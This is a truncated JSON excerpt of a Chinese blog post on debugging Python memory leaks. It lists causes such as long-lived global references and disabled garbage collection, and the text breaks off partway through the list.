问题引入<br>虽然Python本身有垃圾回收机制，但是也有内存泄露的可能。这里我对这次调试项目代码的经验作简单总结，予以参考。一般来说，可能出现内存泄露的情况，有如下几种：<br>1.对象被全局变量所引用，而生命周期较长<br>2.gc被禁用，使用gc.disabl","link":"","raw":null,"photos":[],"categories":[],"tags":[{"name":"Dev","slug":"Dev","count":2,"path":"api/tags/Dev.json"}]}]}